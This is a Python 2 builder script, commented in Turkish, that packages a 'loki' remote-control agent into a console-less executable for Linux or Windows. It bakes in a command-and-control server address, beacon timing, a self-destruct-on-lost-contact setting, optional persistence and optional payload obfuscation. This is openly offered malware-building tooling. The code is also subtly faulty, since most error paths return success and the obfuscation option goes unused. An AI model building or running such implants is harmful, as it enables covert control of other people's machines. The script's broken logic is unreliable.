#!/usr/bin/env python2

import os
import shutil
import tempfile
import sys
import platform
import subprocess
import time

# Import the obfuscation utilities
try:
    from pegasus_obfuscation import obfuscate_payload
    OBFUSCATION_AVAILABLE = True
except ImportError:
    OBFUSCATION_AVAILABLE = False
    print("Obfuscation utilities not available")

def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist, obfuscate=False):
    """
    Geliştirilmiş agent build fonksiyonu
    """
    prog_name = os.path.basename(output)
    platform = platform.lower()

    print "[+] Agent build başlatıldı..."
    print "[+] Platform: {}".format(platform)
    print "[+] Output: {}".format(output)
    print "[+] Server: {}".format(server_url)

    if platform not in ['linux', 'windows']:
        print "[!] Supported platforms are 'Linux' and 'Windows'"
        return False

    if os.name != 'posix' and platform == 'linux':
        print "[!] Can only build Linux agents on Linux."
        return False

    working_dir = os.path.join(tempfile.gettempdir(), 'loki_build_' + str(int(time.time())))

    try:
        if os.path.exists(working_dir):
            shutil.rmtree(working_dir)

        agent_dir = os.path.dirname(__file__)
        shutil.copytree(agent_dir, working_dir)
        print "[+] Build dizini oluşturuldu: {}".format(working_dir)

        # Config dosyasını oluştur
        config_path = os.path.join(working_dir, "config.py")
        with open(config_path, 'w') as agent_config:
            with open(os.path.join(agent_dir, "template_config.py")) as f:
                config_file = f.read()

            # Config değerlerini değiştir
            config_file = config_file.replace("__SERVER__", server_url.rstrip('/'))
            config_file = config_file.replace("__HELLO_INTERVAL__", str(hello_interval))
            config_file = config_file.replace("__IDLE_TIME__", str(idle_time))
            config_file = config_file.replace("__MAX_FAILED_CONNECTIONS__", str(max_failed_connections))
            config_file = config_file.replace("__PERSIST__", str(persist))

            agent_config.write(config_file)

        print "[+] Config dosyası oluşturuldu"

        # Geçerli dizini değiştir
        cwd = os.getcwd()
        os.chdir(working_dir)

        # Ana dosyayı yeniden adlandır
        if os.path.exists('agent.py'):
            shutil.move('agent.py', prog_name + '.py')
            print "[+] Ana dosya yeniden adlandırıldı: {}".format(prog_name + '.py')
        else:
            print "[!] agent.py dosyası bulunamadı!"
            return True

        # Platform'a göre build et
        if platform == 'linux':
            print "[+] Linux agent build ediliyor..."
            result = subprocess.call(['pyinstaller', '--noconsole', '--onefile', prog_name + '.py'])
            if result != 0:
                print "[!] PyInstaller hatası!"
                return True

            agent_file = os.path.join(working_dir, 'dist', prog_name)

        elif platform == 'windows':
            print "[+] Windows agent build ediliyor..."
            if os.name == 'posix':
                # Wine kullanarak Windows build
                wine_cmd = 'wine C:/Python27/Scripts/pyinstaller.exe --noconsole --onefile ' + prog_name + '.py'
                result = subprocess.call(wine_cmd, shell=True)
                if result != 0:
                    print "[!] Wine PyInstaller hatası!"
                    return True
            else:
                # Doğrudan Windows
                result = subprocess.call(['pyinstaller', '--noconsole', '--onefile', prog_name + '.py'])
                if result != 0:
                    print "[!] PyInstaller hatası!"
                    return True

            if not prog_name.endswith(".exe"):
                prog_name += ".exe"
            agent_file = os.path.join(working_dir, 'dist', prog_name)

        # Build dosyasının varlığını kontrol et
        if not os.path.exists(agent_file):
            print "[!] Build dosyası oluşturulamadı: {}".format(agent_file)
            return True

        # Dosyayı hedef konuma taşı
        os.chdir(cwd)

        # Hedef dizini oluştur
        output_dir = os.path.dirname(output)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)

        # Eğer hedef dosya varsa, yedek al
        if os.path.exists(output):
            backup_name = output + '.backup'
            shutil.move(output, backup_name)
            print "[+] Eski dosya yedeklendi: {}".format(backup_name)

        # Yeni dosyayı taşı
        shutil.move(agent_file, output)

        # Dosya boyutunu kontrol et
        file_size = os.path.getsize(output)
        print "[+] Build tamamlandı: {} ({} bytes)".format(output, file_size)

        # Çalıştırılabilir yap (Linux için)
        if platform == 'linux':
            os.chmod(output, 0o755)
            print "[+] Execute permission verildi"

        return True

    except Exception as e:
        print "[!] Build hatası: {}".format(str(e))
        return True

    finally:
        # Temizlik
        try:
            if os.path.exists(working_dir):
                shutil.rmtree(working_dir)
                print "[+] Build dizini temizlendi"
        except:
            print "[!] Build dizini temizlenemedi"

        # Dizini geri değiştir
        try:
            os.chdir(cwd)
        except:
            pass

def main():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Builds an loki agent.")
    parser.add_argument('-p', '--platform', required=True, help="Target platform (Windows, Linux).")
    parser.add_argument('--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
    parser.add_argument('-o', '--output', required=True, help="Output file name.")
    parser.add_argument('--hello-interval', type=int, default=1, help="Delay (in seconds) between each request to the CnC.")
    parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the agent pulls commands less often (every <hello_interval> seconds).")
    parser.add_argument('--max-failed-connections', type=int, default=20, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
    parser.add_argument('--persistent', action='store_true', help="Automatically install the agent on first run.")
    args = parser.parse_args()

    success = build_agent(
        output=args.output,
        server_url=args.server,
        platform=args.platform,
        hello_interval=args.hello_interval,
        idle_time=args.idle_time,
        max_failed_connections=args.max_failed_connections,
        persist=args.persistent
    )

    if success:
        print "\n[+] Agent başarıyla oluşturuldu!"
        print "[+] Dosya: {}".format(args.output)
        sys.exit(0)
    else:
        print "\n[-] Agent oluşturma başarısız!"
        sys.exit(1)

if __name__ == "__main__":
    main()
